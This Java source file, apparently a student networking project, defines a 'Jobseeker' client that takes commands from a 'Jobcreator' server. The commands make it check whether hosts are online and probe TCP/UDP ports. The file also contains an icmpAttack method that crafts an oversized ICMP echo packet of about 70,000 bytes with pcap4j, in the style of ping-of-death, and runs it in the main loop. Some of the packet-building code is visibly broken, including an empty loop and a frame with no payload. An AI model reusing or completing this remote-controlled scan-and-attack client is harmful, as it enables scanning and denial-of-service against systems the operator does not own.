// A Java program for a Client


import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;

import java.io.*;
import java.net.*;
import java.util.concurrent.atomic.AtomicReference;
//import java.util.Arrays;

public class Jobseeker{


    public static void main(String[] args) {

        String hostname = "127.0.0.1"; // current IP to be changed later
        int port = 5000; // for peer to peer connection change to port = 61555
        PrintWriter toServer = null;

        try {
            Socket socket = new Socket(hostname, port);
            System.out.println("Connected to Jobcreator.");

            // Creating output stream to Jobcreator
            OutputStream out = socket.getOutputStream();
            toServer = new PrintWriter(out, true);

            // Jobseeker receiving Data from a connected Jobcreator
            InputStream input = socket.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(input));

            while(true) {
                // testing block .. beginning
                icmpAttack("127.0.0.1");
                //testing block .. end
                // JOB ASSIGNMENTS
                System.out.println("Waiting for job assignments...");

                String job = reader.readLine();
                System.out.println("Job received: " + job);
                String[] tokens = job.split(","); // Contains data of job


                // Pick job (first token determines job)
                switch (Integer.parseInt(tokens[0])) {
                    // JOB: Detect if a given IP address or Host Name is online or not
                    case 1:
                        boolean isOnline;
                        // Detecting by IP
                        if (Integer.parseInt(tokens[1]) == 1)
                            isOnline = InetAddress.getByAddress(convertIP(tokens[2])).isReachable(5000); //Checking if IP address is online

                            // Detecting by Host Name
                        else
                            isOnline = InetAddress.getByName(tokens[2]).isReachable(5000); // Checking if Host Name is online

                        // Output of job
                        if (isOnline)
                            toServer.println(tokens[2] + " is online.");
                        else
                            toServer.println(tokens[2] + " is not online.");
                        break;
                    // JOB: Detect the status of a given port at a given IP address
                    case 2:
                        // Output of job
                        toServer.println(job2(tokens[1], Integer.parseInt(tokens[2])));
                        break;
                    case 3:
                        // Disconnect from Jobcreator and exit
                        toServer.flush();
                        socket.close();
                        reader.close();
                        return;
                }
                toServer.flush();
            }
        }
        catch(Exception e) {
            if (toServer != null)
                toServer.println("error"); // Input error
        }
    }

    // Converts string IP address to byte[]
    public static byte[] convertIP(String IPString) {
        String replaced = IPString.replace('.', ',');
        String[] newIPString = replaced.split(",");

        byte[] ipAddress = new byte[newIPString.length];
        for(int i = 0; i < newIPString.length; i++) {
            ipAddress[i] = (byte) Integer.parseInt(newIPString[i]);
        }

        return ipAddress;
    }

    // Outputs Job2
    public static String job2(String hostName, int portNum) {
        String output = "closed";
        try {
            (new DatagramSocket(portNum, InetAddress.getByName(hostName))).close();
            output = "UDP open";
            (new Socket(hostName, portNum)).close();
            return "TCP and UDP open";
        } catch(IOException ignored) { }

        try {
            (new Socket(hostName, portNum)).close();
            output = "TCP open";
        } catch(IOException ignored) { }

        return output;
    }

    public static void icmpAttack(String target) throws UnknownHostException, SocketException {
        PcapHandle handler;
        PcapNetworkInterface device;
        PcapStat stat;

        byte[] data = new byte[70000];
        for(int i=0; i< data.length; i++){
            data[i] = (byte) i;
        }


        try{
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);

            //
            device = Pcaps.getDevByAddress(targetAddress);
            System.out.println(device);
            System.out.println("Before Handler");
            handler = device.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
            stat = handler.getStats();
            PacketListener packetlistener = new PacketListener() {
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets: ");
                    System.out.println(pcapPacket.getTimestamp());
                    System.out.println(pcapPacket);
                }
            };
            handler.loop(40, packetlistener);
            System.out.println("Before Handler SendPacket");

            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
            echoPacket.identifier((short) 1);
            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));

            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
            echoIcmp.type(IcmpV4Type.ECHO);
            echoIcmp.code(IcmpV4Code.NO_CODE);
            echoIcmp.payloadBuilder(echoPacket);
            echoIcmp.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
            ipV4Builder.version(IpVersion.IPV4);
            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
            ipV4Builder.ttl((byte) 100);
            ipV4Builder.protocol(IpNumber.ICMPV4);
            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
            ipV4Builder.payloadBuilder(echoIcmp);
            ipV4Builder.correctChecksumAtBuild(true);
            for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
                
            }
            ;

            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
            ethernet.dstAddr(MacAddress.getByAddress(ni.getHardwareAddress()));
            ethernet.srcAddr(MacAddress.getByAddress(NetworkInterface.getByInetAddress(localhost).getHardwareAddress()));
            ethernet.type(EtherType.IPV4);
            ethernet.paddingAtBuild(true);

            Packet packet = ethernet.build();
            handler.sendPacket(packet);
            System.out.println(stat.getNumPacketsCaptured());

        }
        catch (Exception p){
            p.printStackTrace();
        }


    }
}

